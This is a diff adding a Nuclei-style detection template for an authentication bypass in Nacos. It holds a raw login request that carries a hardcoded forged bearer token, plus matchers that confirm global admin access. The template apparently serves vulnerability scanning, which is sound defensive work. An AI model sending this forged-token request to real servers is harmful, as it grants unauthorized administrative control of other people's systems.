@@ -1,0 +1,31 @@
+id: nacos-authentication-bypass
+info:
+  name: Nacos Authentication Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The open source service management platform Nacos has a high-risk vulnerability of authentication bypass in versions 0.1.0 to 2.20, which causes attackers to bypass key authentication and enter the background, resulting in system control and other consequences.
+  reference:
+    - https://nacos.io/zh-cn/docs/v2/guide/user/auth.html
+    - https://github.com/alibaba/nacos/issues/10060
+  tags: permission-bypass
+http:
+  - raw:
+      - |
+        POST /v1/auth/users/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3ODg4Nzk5NX0.w2VzOFqZYQTMhwpkZ5w4BeyCLPWfY982zTbNSvvfnb4
+
+        username=aabbccd&password=wdqdqda
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"username\":\"nacos\""
+          - "\"globalAdmin\":true"
